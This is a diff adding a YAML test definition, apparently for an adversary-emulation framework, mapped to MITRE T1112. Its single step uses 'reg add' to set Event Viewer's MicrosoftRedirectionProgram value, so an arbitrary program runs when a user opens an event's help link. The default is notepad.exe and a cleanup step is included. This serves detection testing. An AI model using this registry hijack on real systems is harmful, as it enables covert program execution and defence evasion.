@@ -1,0 +1,23 @@
+api_version: "2.0"
+name: Event Viewer Registry Modification - Redirection Program
+description: Modify event viewer registry values to alter the behavior of the online help redirection. Upon opening an event in event viewer and attempting to view the help page for the event, it will execute the program defined in the redirection program registry entry.
+args:
+    - name: redirection_program
+      type: path
+      default: C:\windows\system32\notepad.exe
+uuid: 81483501-b8a5-4225-8b32-52128e2f69db
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1112: Modify Registry'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: event-viewer-registry-modification---redirection-program
+      inline: reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d "{{.Args.redirection_program}}" /f
+      executor: command_prompt
+      cleanup:
+        inline: reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /f
+        executor: command_prompt
